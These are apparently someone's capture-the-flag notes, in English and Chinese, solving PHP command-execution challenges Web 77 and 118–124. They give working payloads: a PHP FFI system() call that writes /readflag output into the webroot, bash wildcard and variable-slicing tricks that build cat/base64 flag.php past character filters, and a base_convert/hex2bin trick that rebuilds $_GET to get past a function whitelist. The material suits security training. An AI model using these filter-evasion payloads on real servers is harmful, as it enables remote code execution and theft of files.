...
# Web 77
![[Pasted image 20241008073452.png]]
I've found the flag, which is in the `flag36x.txt`.
...
```
need to transfer the payload:
```
c=$ffi = FFI::cdef("int system(const char *command);"); $a='/readflag > /var/www/html/1.txt'; $ffi->system($a); exit();
```

At last, we need to read the `1.txt` file.
```
c=readgzfile("1.txt");exit;
```
![[Pasted image 20241008074219.png]]
# Web 118
![[Pasted image 20241008074348.png]]


Insert the command into the blank space:
![[Pasted image 20241008074828.png]]
Then view the source:
![[Pasted image 20241008074751.png]]
构造语句
...
这是一个条件语句，其中IFS表示内部字段分隔符，????.???表示用来匹配`flag.php`。
这个条件语句的意思是，如果PATH环境变量中存在任何路径，并且这些路径匹配`flag.php`，那么条件就成立，脚本会执行相应的代码。

### 总结

综合起来，这个示例的意思是，如果PATH环境变量中存在任何路径，并且这些路径匹配`flag.php`，那么从PATH变量中选择第一个路径，并将其作为结果输出。否则，从当前工作目录中选择第一个路径，并将其作为结果输出。

# Web 119
![[Pasted image 20241018075407.png]]
```
0：${#}；
...
```
![[Pasted image 20241018075238.png]]
# Web 120
![[Pasted image 20241023180906.png]]
```
${PWD::${##}}???${PWD::${##}}${PWD:${#IFS}:${##}}?? ????.???
...
/???/r?? ????.???
```
![[Pasted image 20241023181217.png]]

# Web 121
跟上一题一样。
![[Pasted image 20241024075411.png]]
# Web 122
![[Pasted image 20241024123406.png]]
把`#`也给过滤掉了，我们需要找到替换。
```
$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误
```
构造错误命令，使`$?`的结果为$1$，代替`${##}`来分割。
命令`<A`是一个错误命令。
因此可以构造
`/bin/base64 flag.php => /???/????6? ????.??? => <A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.???`
多试几次，长度较长的那个包里边包含正确结果
![[Pasted image 20241024123819.png]]
![[Pasted image 20241024123904.png]]
# Web 124
![[Pasted image 20241027095152.png]]

源码过滤了大部分的东西，因此我们只能使用白名单的参数，
但是题目的参数并不支持我们执行命令执行，因此我们要想办法绕过。
于是我们想到了，让参数逃逸，这样无论我们输入什么都不被过滤：
```
c=$_GET[参数];&参数=...
```
我们的参数也被过滤了，但是有白名单，因此我们使用白名单里面的参数进行传参。
但是`$_GET`被过滤了，怎么构造呢？

正则`preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);`
将检查所有数字和特殊符号。
一旦检查出一个字符不是“奇奇怪怪的字符”，就会用`$content`匹配出函数名。
如果这个函数名在白名单内，那么就会执行`$content`这个函数。

现在问题是如何构造`system(cat flag.php)` 参数为数字。
- 先`echo base_convert('hex2bin',36,10);`得到`hex2bin`的十进制数字，得到`base_convert(37907361743,10,36)`就等于`hex2bin`。
- 再`echo hexdec(bin2hex('_GET'));`得到`_GET`的十进制数字为$1598506324$，所以`hex2bin(dechex(1598506324))`就等于`_GET`。
（为什么不能直接用==十六进制==而非要传递一个==十进制==转换成==十六进制==多此一举呢，也是因为十六进制参数为`0x5f474554`它存在字符，会匹配正则的第一项，从而将后续数字当成函数名导致不能通过白名单。）
所以`base_convert(37907361743,10,36)(dechex(1598506324))`$\Rightarrow$`hex2bin(dechex(1598506324))`$\Rightarrow$`hex2bin(0x5f474554)`就等于`_GET`了。
再提交参数`&1=system&2=cat+flag.php`，也可以不提交数字。
提交一个在白名单的函数名作为参数名也可以过白名单匹配
- 用变量的嵌套`$$cos=$_GET`
- 利用变量的索引`{}`绕过`[]`
```
...
- `hex2bin()`：把十六进制值的字符串转换为二进制，返回 ASCII 字符，==最重要的是`hex2bin`函数，但是不在白名单里面==。


1. `base_convert('hex2bin',36,10) --> 37907361743 `
2. `_GET --> hex十六进制 5f474554 (不能有字母所以十六进制不行)`
3. `hex十六进制 5f474554 --> dec十进制 1598506324`

![[Pasted image 20241027105738.png]]